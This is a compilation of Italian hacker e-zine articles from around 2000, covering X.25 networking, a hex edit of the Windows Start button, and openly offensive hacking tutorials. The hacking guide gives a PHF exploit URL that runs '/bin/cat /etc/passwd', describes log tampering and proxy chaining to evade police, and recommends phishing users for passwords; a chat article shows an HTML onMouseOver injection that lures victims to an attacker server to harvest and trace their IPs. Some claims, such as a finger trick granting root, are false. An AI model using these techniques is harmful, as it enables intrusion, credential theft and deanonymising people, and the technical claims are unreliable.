difficile rimetterli in ordine per avere tutti i nostri dati trasmessi di
nuovo nella sequenza esatta e pronta per essere letta.
Per questi motivi le reti a commutazione di pacchetto sono molto rapide ed
efficienti ed hanno un loro metodo per gestire l'instradamento dei dati.

Quelli che seguono qui sotto sono le tre principali implementazioni delle
reti a commutazione di pacchetto.

	. X.25
	. Frame Relay
	. ATM (Asynchronous Transfert Mode)

Passiamo a parla di esse piu' da vicino, passando in rassegna tutte e tre
le implementazioni ma dedicandoci poi inizialmente alla rete X.25.

POST ORGASMIC X.25 Network
--------------------------

Il protocollo X.25 nasce negli anni 70 per consentire agli utenti delle
reti di dati pubblici una capacita tipo WAN (Wide Area Network).
Ancora oggi e' molto utilizzata ad esempio per fornire connettivita'
tramite canale D di ISDN, ma questo e' un discorso a parte :)
Dunque i primi sviluppatori di questo protocollo furono le compagnie
telefoniche.
Il funzionamento e' il seguente:
Un HOST A chiama un HOST B per potere instaurare una sessione di
comunicazione e se la chiamata e' accettata i due HOST iniziano una
connessione FULL-DUPLEX che puo essere terminata in qualsiasi momento da
uno dei due HOST.
LA connessione che si instaura e' di tipo point-to-point tra il DTE (Data
Terminal Equipment) al sito del client e il DCE (Data Circuit-terminating
Equipment) con l'impianto vettore.
DTE e DCE comunicano tra di loro per mezzio di una trasduzione effettuata
dal PAD, ovvero Packet Assemble Disassembler. Il DCE invece si connette
con il PSE (Packet Switching Exchange), meglio conosciuto come switch,
questi si connettono tra di loro fino a raggiungere il DCE dell'HOST
destinatario. Infine tale DCE si connette con il DTE dell'host per
completare la sessione di commutazione.

DTE
   \
     \
     DCE
      |-\--------------------|
      |	  \                  |
      | SWITCH--------SWITCH |
      |   |   \     /   |    |
      |   |     \ /     |    | 
      |   |      x      |    |
      |   |    /   \    |    |
      |   |  /       \  |    |
      | SWITCH--------SWITCH |
      |  |                   |
      | DCE                  |
      |--|--------------------
         |
        DTE

 - - - - - - - - - - - FINE PRIMA PARTE BY L0rD`n0p1 - - - - - - - - - - - -

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

         ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
         ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
         ÷³     HACKING: TUTTO QUELLO CHE C'E' DA SAPERE        ³÷
         ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
         ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Titolo                : Hacking: tutto quello che c'e' da sapere
Autore                : M4VER1CK
Argomento             : tecniche di base dell'hacking
Difficolta'            : 3/10
Conoscenze necessarie : comandi unix, permessi unix, file di password.              

BrEvE InTrO:

Allora raga in questo articolo si parlera' di hacking in tutti i suoi aspetti:
teoria, pratica, social engeenering, filosofia....Insomma tutto quello che
c'e' da sapere per essere/diventare hackers provetti :) Un consiglio prima di
iniziare veramente... se state imparando questa stupenda arte..LEGGETE!
Dovete leggere + cose che potete, solo cosi' imparerete le tecniche + diverse
e potervi districare nelle situazioni + complicate.

1) Teoria

1.1) Raccoglimento informazioni

La prima cosa che bisogna fare quando si ha intenzione di attaccare un sistema
e' ricavare quante + informazioni potete su di esso. Ogni minima informazione
puo' essere essenziale, anche quella che sembra insignificante. Beh, prima di
tutto dovrete sapere cosa gestisce il sistema che volete attaccare. Mi sembra
ovvio che per attaccare nasa.gov ci si predispone in modo diverso dal
l'attaccare www.beretta.it (quello dei salamini sapete ?? :). Poi consiglio
di dare un' occhiata alla sorgente della pagina web del sistema e vedere se
utilizza degli script, se ci sono degli interpreti di comandi tipo perl
accessibili a tutti e cose di questo tipo, insomma come ho detto prima
tutto puo' servire, anche le cose + insignificanti. Successivamente io
generalmente mi faccio una bella telnettata al sistema in questione e mi
prendo nota del tipo di sistema e della versione. Poi sempre con telnet mi
connetto alla porta 25, posta in uscita, per annotarmi il numero di versione
di SendMail. Per chi non lo sapesse SendMail e' forse il programma + buggato
che la mente umana possa concepire (ovviamente dopo Findus95/98) e si
sfrutteranno questi bug per accedere illecitamente al sistema. Se si vuole
fare un hack proprio fatto bene, cosa che consiglio CaLdAmEnTe, conviene
anche fare un port surfing. Per i NewBies + inesperti fare del portsurfing
significa connettersi a tutte le porte del sistema per vedere quali sono
aperte e a cosa servono. Questo sempre x ricercare eventuali bug nel
software. Poiche' collegarsi a tutte le porte del sistema e' un lavoro lungo e
noioso potete usare dei programmi chiamati portscanner che tentano di
connettersi a tutte le porte e se ci riescono ve lo fanno sapere. Consiglio 
caldamente l'utilizzo di questi programmi poiche' velocizzano molto il lavoro.
Se il sistema permette l'accesso anonimo, siete quasi a cavallo, poiche'
potrete farvici un bel giretto raccogliendo importanti info.
Ok......penso che come raccoglimento di informazioni possa bastare. Ora
passiamo al secondo capitolo, dove finalmente si utilizzeranno le informazioni
ricavate :)

1.2) Exploit e bug

Come voi ben sapete (spero!!) esistono vari sistemi operativi che sono
utilizzati per gestire una rete. Unix, Linux, Irix, IIS, Apache e tanti altri.
Per una strana coincidenza il sistema + bacato tra questi e quello gestito
dalla Micro$oft :)))
cioe' Microsoft IIS (ma possibile che Bill non ne faccia una di giusta ?!?!). 
Questo solo per dire che la microsoft NON e' assolutamente una grande
SoftwareHouseanzi!! E' cosi' famosa e potente perche' e' l'unica a controllare
un sistema operativo (Findus98/95) di facile utilizzo e abbastanza immediato.
Chiusa la parentesi anti-microsoft. Tornando all'hacking, la prima cosa che
faccio io e' connettermi al sistema via telnet e provare le cosi dette
"password di installazione". Cosa sono ??? E' presto detto! Se voi avete mai
installato Linux sulla vostra macchina sapete bene che l'installazione crea
dei login e delle pass e li mette nel file /etc/passwd o se sono shadow nel
file /etc/shadow.
Se il SysAdmin si e' fatto un canna avra' lasciato su le password di
installazione, e noi potremo facilmente accedere al sistema attraverso esse.
Vi consiglio di procurarvi una lista di queste password di installazione, e 
ricordatevi che ogni sistema ha password di installazione diverse. 
Poi e' una buona abitudine fare una altro controllo: il PHF.
Il celeberrimo PHF.
Prima di tutto desidero spiegarvi il funzionamento di questo exploit, poiche'
un bravo hacker deve sempre sapere quello che sta facendo. Il phf e' una 
semplicissima utility di agenda telefonica che puo' essere usata in modo 
sovversivo, semplicemente digitando come url:

http://www.sito.com/cgi-bin/phf?Qalias=x%0A/bin/cat%20/etc/passwd

Il file PHF viene eseguito, vengono passati parametri fittizzi, e si simula un 
invio a capo (%0A) e poi si esegue il comando /bin/cat /etc/passwd. In questo
modo sulla schermata del browser verra' mostrato il file di password. Se le
password sono shadowed potrete mettere al posto di "passwd", "shadow". 
Voi direte: "ma il file shadow non e' accessibile solo al root ??"
Vero vi rispondo io...ma vi dico anche che in quel momento noi abbiamo accesso
root!!! Consiglio: non riponete tutte le vostre speranze su questo attacco, 
poiche' per esperienza vi dico che nel 90% dei casi non funziona. Una volta
poteva essere una buona risorsa, ma ora non +. Un attacco che invece funziona 
molto bene e quello del finger. Se dal vostro buon port surfing siete riusciti
a collegarvi alla porta 79 questo attacco puo' essere effettuato altrimenti,
bisogna ricorrere ad un trucchetto :)) Innanzi tutto bisogna dire che 
l'attacco alla porta finger puo' essere di due tipo il primo D.o.S. il secondo
sfrutta un bug. La sigla D.o.S. significa Denial Of Service e consiste nel 
collegarsi molte volte alla porta finger affinche' il sistema non sopporti la
mole di lavoro richiesta e nel migliore dei casi' crashera', cosi' noi potremo
avere l'agognato accesso r00t. Invece per realizzare il secondo attacco
dovrete seguire i seguinti passi:

1) Collegarsi alla porta 79
2) Scrivere ///* seguito da Ctrl+S

A questo punto avete accesso root :) Ctrl+S e' il cosi' detto comando "freeze". 
Nello sventurato caso in cui il bravo SysAdmin :) abbia disabilitato la porta
Finger noi non potremo realizzare questo attacco. Ma probabilmente il sempre
bravo SysAdmin ha solo disabilitato la porta ma non ha cancellato il file
finger dal sistema. Quindi noi potremo accedervi digitando nel browser:

http://www.sito.com/cgi-bin/finger

per passare parametri al file dovete usare ? cioe' finger?parametri.
Simile a finger c'e' anche ping, ma poiche' il funzionamento e' + o - lo stesso 
non sto qui a spiegarlo. Oltre alla porta 79 e' utile da un punto di vista
hacker la porta 25 che come detto prima e' la porta di posta in uscita. Il
programma che gestisce la stessa, SendMail, e' un programma con molti buchi,
alcuni molto gravi, altri meno, ma qualsiasi versione, anche la + nuova ha
almeno un baco da sfruttare per accedere al sistema.Per parlare di tutti i bug
che ha sendmail in tutte le sue versioni non basterebbero 100 di questi
articoli, quindi segnatevi la versione di SM e andate in siti hacker
(www.rootshell.com, l0pht.com, www.hackers.com, www.8lgm.org) e cercate
l'exploit relativo.
Se nei sorgenti della pagina che vi siete salvati nell'HDD vedete che essa
utilizza degli intepreti di comandi tipo Perl potete fare pressoche' quello
che volete. Potete se volete anche cancellare tutta la directory :))))
Basta solo conoscere il linguaggio in questione, in questo caso perl.
Ecco, direi che queste tecniche possono bastare. Se volete avere altre 
tecniche a vostra disposizione studiatevi imap2 e wu-ftp.
Cmq se nessuna di queste dovesse funzionare potete sempre segnarvi la 
versione dell'OS da attaccare, fare un saltino sui siti sopra citati e 
cercare l'exploit relativo. E ricordatevi che nessun sistema e' sicuro, e ha 
sempre dei buchi.
   
1.3) Occultamento

La parte in assoluto + importante dell'hacking e' l'occultamento, poiche' se
riuscite ad hackerare il sito della NASA (fatemi sapere!!!) ma lasciate le 
vostre tracce in giro, il giorno dopo verra' l'interpol a casa vostra, e non 
x una visita di piacere!!! Quindi fate molta attenzione a questa parte, 
poiche' FoNdAmEnTaLe. Innanzi tutto: siate paranoici. Criptate tutte le info
conpromettenti, NON scrivetevi le password di sistemi su fogli o cose
simili. Deve essere TUTTO su HDD e tutto criptato. Bene, spero che seguiate
questi consigli, poiche' se un hacker + esperto di voi vi entra nel picci'...
La prima cosa che farete quando hackererete un sistema e' fare un giretto sul
suo sito, x prelevare un po' di informazioni. Ma non vorrete mica andarci
con il vostro IP in bella mostra no ?!?!? A questo scopo si usa il proxy 
server. Esso e' stato creato per ben altri scopi che l'hacking, ma in effetti
questo strumento agli hacker e' mooolto utile. In parole povere il proxy 
funge da intermediario fra la pagina che vogliamo visitare e il nostro picci'.
Noi mandiamo i dati al proxy e il proxy li invia al sito. Cosi' l'ip che il
sito registrera' sara' quello del proxy e non il nostro!! Attenzione pero':
il sito ha l'ip del proxy...ma il proxy ha il nostro ip quindi siamo daccapo.
NO! Se noi concateniamo + di un proxy ??? Risultera' una specie di catena....
Inoltre alcuni proxy se visitiamo molti siti cancellano gli indirizzi 
visitati prima....quindi...beh spero abbiate capito :))))))
I proxy si settano facilmente dal browser. In netscape si setta dal menu
"Preferences". Nota: usando i proxy poiche' devo filtrare i dati rallenteranno 
un po' la connessione. L'equivalente dei proxy il telnet sono chiamati 
wingate. Voi vi connettete al wingate e digitate l'indirizzo del sistema a 
cui volete connettervi. Hanno lo stesso modello del proxy. 
Ok, adesso potete operare in santa pace. Ma una volta che avete prelevato il
file delle password, le avete decriptate, e volete operare nel sistema i
problemi non sono finiti. Tutto cio' che gli utenti fanno viene registrato in
dei file log che sono utmp e wtmp. Ci sono in aggiunta altri file che vi 
conviene modificare a vostro vantaggio. I file btmp e messanges. Btmp mostra
i tentativi di login non andati a buon fine, mentre messanges mostra 
messaggi di vario tipo....ed e' molto piu' pericoloso di quello che si possa
pensare. In generale questi file non sono modificabili dall'utente normale,
quindi vi consiglio, una volta ottenuta una shell, di trovare un exploit x
rootarla, cioe' x farle avere i permessi di root e quindi in grado di 
modificare questi file.

2) Varie ed eventuali

2.1) Etica e stile

Quando si pronuncia la parola hacker ci viene erroneamente in mente colui che 
penetra illegalmente in sistemi informatici x rubare informazioni riservate.
Un hacker e' proprio la cosa opposta :) Egli tenta si di penetrare illegalmente
in sistemi informatici, ma non per rubare informazioni, ma per studiare come
questi sono fatti e studiare i buchi che possono avere. Una volta penetrato in
quel sistema attraverso un bug del software, il bravo hacker lo fa subito 
notare al SysAdmin. Ovviamente cosi' dovrebbe essere in teoria, in pratica non
avviene assolutamente cosi', poiche' chi penetra in un sistema, si guarda bene
dal dire al sysadmin attraverso che bug e' entrato, e tantomeno non sfrutta
il suo accesso al sistema. Molti hacker (compreso me) forzano dei sistemi per 
avere accesso a shell, meglio se di root, per svariati motivi: x mettere 
IRCBot, per mettere bnc (nel caso dell'accesso root), usare smurf e hackerare,
attraverso quelle shell altri sistemi. 
Ovviamente ogni hacker possiede il suo stile. Chi predilige gli attacchi DoS,
chi gli exploit, chi predilige lo sniffing, insomma ci sono infinite tecniche
e sceglierete quella che vi aggrada di +. Ho parlato di sniffing...ma cos'e' ?
Fare dello sniffing significa rubare informazioni attarverso programmi che 
loggano, per esempio tutto quello che si digita sulla tastiera, o che rilevano
le password e i login e li inviano ad una certa email. Lo sniffing non e' solo
ed esclusivamente questo ma diciamo che le basi sono queste. Diciamo pure che
e' un'arte a parte, a cui bisognerebbe dedicare tutto un articolo, percui vi
rimando a un articolo su di esso.

2.2) Social Engeenering
   
Il S.E. costituisce una parte molto importante dell'hacking. Spiegare cos'e' 
non e' molto semplice, ma sono sicuro che con un esempio capirete subito. 
Allora un esempio di Social Engeenering e' spedire un'email ad un utente 
qualsiasi dicendo di essere un impiegato Telekom e di rispondere all'email
inserendo la propria password e il proprio UserID perche' c'e' stato un 
problema di aggiornamento di database :)) L'utente nel 95% dei casi non 
capira' che quell'email non e' di un impiegato telecazz ma di un hacker e vi 
spedira' la UserID e la pass, cosi' voi potrete usare il suo abbonamento per 
hackare :)) Questo non e' l'unico impiego pratico del social engeenering.
Uno molto usato e' far telefonare da una vostra amica ad un abbonato 
facendosi credere la famosa "signorina della Telekazz" e chiedere le solite
userid e pass. Insomma nel s.e. potrete dare sfogo a tutta la vostra 
fantasia, potrete inventare, simulare....fare quello che volete insomma!!!

CoNcLuSiOnI

Ok ragazzi, siamo arrivati alla fine di questo articolo, spero di esservi
stato di aiuto! Ricordatevi che queste tecniche sono asssolutamente 
di base e probabilmente anche conoscendole non saranno suffi, E mi rakkomando
HACKATTTTEEEEEEE!!!!

cya
                                              M4VER1CK


ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

     ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
     ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
     ÷³   COME CAMBIARE QUEL BRUTTO START SUL MENUZ AVVIO IN WINZ   ³÷
     ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
     ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

-=-=- come cambiare quel brutto "start" sul menuz avvio in winz -=-=-

								\/
th1s is ded 2: sempre loro... all my friendz                  .-++-.
music h3ard  : NFAA                                          / /  \ \   
consumed     : devo andare a mangiare =)                     |/----\|
used         : gvim5 e khexedit on suse6.2                   X      X
a b1g FUCK 2 : Piera Moretti Totaro, bastardissima          / ·----· \
	       professoressa di inglese.

vi siete mai chiesti come cambiare il testo sul tasto "avvio" di win9x?
con start99? un prog che x fare una caxxate occupa 800KB????
e che newbiez siamo allora ?:))
occorrente: win9x/nt(4 o 5)
	    hiew o altro editor esadecimale (hexpert, ghex, khexedit ecc)
	    3 minuti di tempo
come ho fatto a trovarlo? usando start99 hehehe ;) e filemon,
un utilissimo prog che si puo trovare su www.sysinternals.com e che xmette
di vedere tutti i file che vengono utilizzati da winz :-P
ma questo non c'entra :)

dicevo... aprite il vostro winx e fate partire l'editor esadecimale e aprite
explorer.exe . 
vi troverete davanti il listato in esadecimale del contenuto del file binario
bene.. a questo punto vi verra' in mente di cercare "start".. ma troverete
tutto meno che quello che ci interessa. infatti la stringa e' scritta si nel
file, ma tra un carattere e l'altro ce' un NUL (00 in hex), quindi nell'editor
appare cosi':

00 00 50 41 00 00 00 00 05 00 53 00 74 00 61 00  ..PA......S.t.a.
72 00 74 00 a3 00 55 00 6e 00 61 00 20 00 64 00  r.t.e'.U.n.a. .d.

e neppure cercando S<spazio>t<spazio>a<spazio> ecc. troverete nulla, perche'
in hex il carattere <spazio> equivale a 20.

quindi dicevamo.. x modificare non bisogna fare altro che sovrascrivere la
stringa esistente... bene facciamolo :=)
piccola nota: gli "spazi" fra le lettere NON SONO spazi! sono dei NULL...
vale a dire 00.. e tali devono rimanere, altrimenti appariranno 5 simpatici
trattini al posto del vostro "cazzi" ;)

otteniamo una cosa tipo:
00 00 50 41 00 00 00 00 05 00 43 00 61 00 7a 00  ..PA......C.a.z.
7a 00 69 00 a3 00 55 00 6e 00 61 00 20 00 64 00  z.i.e'.U.n.a. .d.

uccidendo l'explorer con ctrl+alt+canc (facendo termina applicazione con
explorer apparira' la finestra di spegnimento... fate annulla e intanto il
"task manager" che gestisce i processi (ps ne capisco poco di proc in win :))
continuera' a tentare di chiudere explorer, ma non riuscendoci dopo 5 secondi
apparira' la finestra "termina"... explorer in w9x si spegne e si riaccende, in
nt bisogna ricaricarlo a mano col task manager) e ricaricandolo avremo il
nostro nuovo menu :)

ma se volessimo una stringa +lunga di 5 caratteri? hehehe
dicevo nell file e' scritta anche la lunghezza della stringa.. ed e' quel
carattere prima del NULL (00) che precede la prima lettera della stringa
del menu.. per capirci, questo:

			||
			VV
00 00 50 41 00 00 00 00 05 00 43 00 61 00 7a 00  ..PA......C.a.z.

cioe' 05.. cos'e' 05 se non il numero di caratteri? :)
modificando (in hex) questo numero, potremo mettere fino a FF (256)
caratteri (naturalmente x metterne ad ex. 12 non bisogna scrivere 12,
ma 0C.. siamo in hex :)
per scrivere tutta la stringa che vogliamo ci sono 2 possibilita':
· sovrascriviamo il messaggio che viene dopo (una delle finestre della
shell e' stata chiusa a causa di un errore interno ecc ecc)
· allunghiamo il file

la prima possibilita' e' la + sicura,, io non ho mai visto quell'err e non so
come si possa presentare (e si che in win il look degli errori e' importante
;) ma explorer funger regolarmente.. e so che non e' bene modificare la
lunghezza di un file compilato,, poi chiedete a qc + esperto di me :)
la 2a possibilita' l'ho provata una volta, e oltre al fatto che explorer non
aveva + l'icona non ho notato nient'altro... magari se provate su una copia
del vostro e mi fate sapere ne sarei felice 0:-]

credo non ci sia da dire altro.. su altre stringhe dell'explorer non ho
provato, fate voi :)
ah... se volete ancora divertirvi potete cercare nel registro "Schede video"
e sostituirli con .. che so "dispositivo videospruzzante" e poi mettere
"mardox g800 256MB" ;D

bene la fame si fa proprio sentire,,, ciao a tutti !

vostro 0xF3A0ED00 vejeta <administrator@penguinpowered.com>

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
<><><><><><><><> COSA SI PUO' FARE IN UNA WEB-CHAT =) <><><><><><><><>
<><><><><><><><><><><><><>  X rEaL NEWBIEs  <><><><><><><><><><><><><>
<><><><><><><><><><><><><><><><><><><><><><><><><>bY F3D3R1[0 <><><><>
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

PREMESSA IMPORTANTE: Sono solo un NewBie se cosi' mi posso definire...
     		     ma per essere veramente sincero mi dichiererei un
 		     pazzo che vaga nel W&B in cerca di non so cosa ;)
		     Tutto  questo per  farvi capire  di  non prendere
        	     questo art. troppo sul serio perche' non sono  ne 
      	             un hacker ne cracker ma solo un NEWBIE ;)

PARTIAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO !!!

Innanzi tutto per chattare in una web-chat bisogna sapere un minimo di 
linguaggio HTML, il linguaggio per costruire pagine W&B, quindi se non 
l' avete mai sentito dire .... mmhhhh e' meglio se  imparate  qualcosa
altrimenti non  potrete capire quello  che vi sto per  insegnare ... e 
farete solamente i lamah copiando l'idea ;) 

Il campo dove operare  logicamente sono le chat in formato html ... ma 
soprattutto direi che l'unica chat che conosco, almeno io, e' quella 
di Radio DeeJay ... che si trova  all' URL: www.deejay.it/cgi-bin/chat
e per poterci entrate, secondo i WEBMASTER, dovrete essere  registrati
ma e' tutta una stronzata!!! ;)

FUNZIONAMENTO DELLA CHAT DI RADIO DEEJAY ;)
		___________________
                |                  |
		|        1         |
		|                  |
		|__________________|
		|  __    __   __   |
		| |2_|  |3 | |4_|  |
		|  ______________  |
		| |______5_______| |
		|  _________   __  |
		| |____6____| |7_| |
		|  _____           |
		| |__8__|          |
		|__________________|

Legenda: 1=spazio dove ci sono i messaggi scritti 
         2=spazio dove mettere il proprio nick
         3=spazio per la password "obbligatoria" ;)
         4=spazio da cui si selezionano i messaggi visibili ad ogni  	     
           aggiornamento
         5=spazio dove scrivere i messaggi
         6=spazio che si chiama "pseudo che vedranno gli altri" ma in  	     
           questo spazio dovremo mettere i TAG HtmL per abbellire i  
	   messaggi o per usare qualche strategia in HtmL =)
         7=tasto aggiorna
         8=tasto da cui si puo' scegliere di andare in aree diverse e 
	   di chattare con altre persone. da scegliere c'e' area1 e 
	   area2. molte e' ?! :))
           

Ok comiciamo ... per potere tracciare degli ip in una chat del genere
non  dovete fare altro che fare un collegamento "involontario" ad una
pagina web predefinita che un prog monitorera' e rendera' visibili gli
ip che la hanno  visitata... 

-------------------------- Nota Importante --------------------------
Ricordate pero' che questo modo di tracciare ip non e' perfetto... ma
ha un grande difetto che ancora non sono riuscito a modificare ed ora
ve lo spiego... Quando la vittima visitera' il link non gli apparira' 
una normale pagina con su scritto 404 error page not found ma una pag
con un link verso la homepage del prog SambarServer ... quindi  se e'
uno che ci capisce qualcosa o ha un minimo di curiosita' vi scoprira' 
subito ma non potra' farvi niente dato che non ha nessuno  dato su di 
voi... quindi non cacatevi in mano... ;) non vi puo' succedere niente

-------------------------------- Fine -------------------------------
 
I programmi che ci aiuteranno a far cio' 
sono 2 ( per quel che riguarda scoprire l'ip e il  proprietario) e si
chiamano:

SAMBAR SERVER v.4,2 : E' un  prog che va installato e apre un "server"
                      su un ip prestabilito dal prog che viene scritto
                      nella finestra e sara' quello  l'ip dove saranno
                      dirette le prede(contorto eh? vabbe' ho 6 a ita)

VISUALROUTE: Ci da delle utili informazioni su un ip da noi immesso
             (va benissimo anche quelsiasi altro programma che ci dia
             la possibilita' di sapere info utili su un ip)

Detto questo iniziamo con la pratica!!! forse ora si capisce ;)
Aprite il SAmbarServer e segnatevi l'ip ...
poi andate in chat e nel campo chiamato Pseudo che vedranno gli altri 
dovete mettere 2 tag ( instruzioni in HtmL ) che ci permettano:

1)di mandare ad un url la vittima 
2)fare in modo che non si accorga di andare in un link
3)fare in modo che il link si  apra solo con  il  passaggio del mouse 
  grazie al TaG "OnMouseOver"

per farlo dovremo scrivere questo tag:

__________________________....- inizio -...._________________________

<span style= font-size=7><a href= http://ip del SAMBAR/index.html 
onMouseover=window.location=this.href> <FONT COLOR=BLACK> passate il
mouse sulla scritta! <font size=7>  
__________________________.....- fine -....._________________________    

copiato il tutto comiciate ad aggiornate continuamente in modo da far
apparire quel messagio + volte possibili nella pagina ... ci si casca
mejo cosi'!!! ;)

ok... aspettando che qualcuno passi il mouse sul messaggio invisibile
(nero come il background ;) mettete in primo piano il Sambar in  modo
che appena uno visita la pagina viene il suo ip nella finestra... poi
prendere quel simpatico numerino ;) e fate cio' che  volete ... cioe'
non proprio tutto!! io vi proporrei di scoprire chi e' il propietario
e  magari  dirgli  che problemi ha  il suo hd oppure  entrare nel suo 
sistema  e coltivargli su un  server in vista di  una futura e sicura
visita... ;)

Oppure fate cosi' che non e' molto faticoso e facilissimo da fare  ed
e' pure divertente !!! ;) (sono proprio un lamah !!! ;)))
Fate un visualroute su l'ip della vittima e cercate  di scoprire piu'
informazioni possibili... e poi con una bella faccia a culo,  aiutati
da un amico o da soli, entrate con un altro nick in chat e fate delle  
domande basate sui date che avete raccolto prima... sempre che  siano
giusti ;)  e scoprirete il possessore dell' ip che  avete trovato ...
facile no?! Una volta scoperto non comiciate a  fare i LamAh nukkando
floodando etc.etc. ma cercate di "acculturarvi"
su quel sistema e mi raccomando... NON FOTTETE NIENTE O  FORMATTATE!!!
SE LO FATE PER ME SIETE SOLI DEI LURIDI LAMAH !!!!!!!!!!!!!!!!!!!!!!!!

Ok e' finito... ;) anche se:

1) non ci avete capito niente
2) non ve ne e' fregato un cazzo ;)
3) vi ha fatto veramenteeee cacare 
4) pensate che sono un lamah

io ce l'ho messa tutta per spiegarvi in modo piu' chiaro questo facile
modo di tracciare e spero che lo proviate ... e mi raccomando ...
state attenti al TEAM sono cattivi con chi fa casini e voi non volete
farne vero?!? ;)

Ed oRa PassIaMo Ai SaLuTI:

SpeCiaL SaLuTOnE Al BaStArDOnE cHE mI HA cErCAt0 Di fORmATTaRE l'HD ;(
ImPArA pRiMa dI fARe lE cOSe ... pU0i nON fARmI vEDeRe cHE fORmAtTI!!!

Saluti f0tTuTI a: tutti  quelli che takkano continuamente i canale irc
                  #hackernow #hackers #warez #arezzo + molti altri e a
                  tutti quelli che mi considerano un lamah!!! prima di
		  scrivere questo articolo (ora lo potete fare ;) 

Saluti c0sICoSi' a: Tutti quelli che non mi cagano quando faccio delle
		    domande e a Guf0Z che mi da sempre del lamer ;)

Saluti AMiChEVoLi a: tutti quelli che stanno in #hackernow  non solo x
		     PRENDERE IP FACILMENTE ;) ma anche per chattare e 
		     scambiare idee e commenti, tutti  quelli che sono
                     nei canali: #cdrita  #arezzo  #mp3.it e in  molti
		     altri in cui non ricordi di essere stato, tutti i
		     BbB (ciao PeterPunk!!!), tutti quelli del TeAm, e
		     poi per ultimo lascerei un salutone mega speciale

CIAO NOBODY E ZERO !!! SIETE MITICI CONTINUATE COSI' !!!!!!!!!!!!!!!!!

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                ÷³  GOCCIA A GOCCIA...IL VASO TRABOCCA  ³÷
                ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Bwahahaha....sto articolo mi gasa proprio !!!
Domanda da 1.000.000 di $ : ma Che aZzO e' un buffer OverfLow ?
Dantuccio answers : Read....and u'll knoW ! :Pp

**Addon da fine articolo**

Prima di scrivere questo articolo non avevo letto quello di BFI6
di SirCondor avente lo stesso topic...ritengo che cmq il mio articolo
non possa essere considerato un plagio o una scopiazzatura e cmq
e' di livello tecnico decisamente + basso dato che e' rivolto ad un
pubblico di newbie o wannabe...come si suol dire...tutto qui'


Thi4 4rT i$ DeD t0 : Pollicina.....aZZ...grazie di sopportarmi!!!
		     e lalli82 la "cifeide"....spero di sentirti
		     presto :Pp
		     Il mio caro amico t^Ek...la sua sorellina
		     Ale(tvb!)..Amed..Antonio...Marea..il criceto
		     e compagnia bella...grazie per i 4 splendidi
		     giorni a Roma...m'avete fatto sentire come un
		     fratello...TnX ancora !

Th|5 ArT |$ Vs-D3D 2 : -Il vil danaro che tutto, ahime', puote...anche
		        vietare lo smau ! :°°°(
 		       -La febbricula con tonsillite 2 giorni prima
			di andare a Roma....argh..(impavido ci sono
			andato lo stesso)

**"Finding and exploiting programs with buffer overflows" by prym**
**Traduction by DanTino AlighiErUcc|o :Pp**

Una delle techinche + usate per guadagnare l'accesso da root e' l'overflow.
Semplicemente in un programma non facciamo altro che trovare dove un'indefinita
lunghezza di dati specificabile dall'user e' copiata in una definita.
Capiamoci meglio....esempiuzzo :Pp

char *ptr;
char visual[1024];                      - (definibile dall'user)

sprintf(visual, "%s %s", ptr, file);    - (ptr(lunghezza indefinita) e' copiata
                                        - nella visibile (lunghezza definita)

In questa funzione causeremo un buffer overflow. Quello che succede in pratica
e' che noi settiamo la visibile con un qualcosa di + grande di 1024.
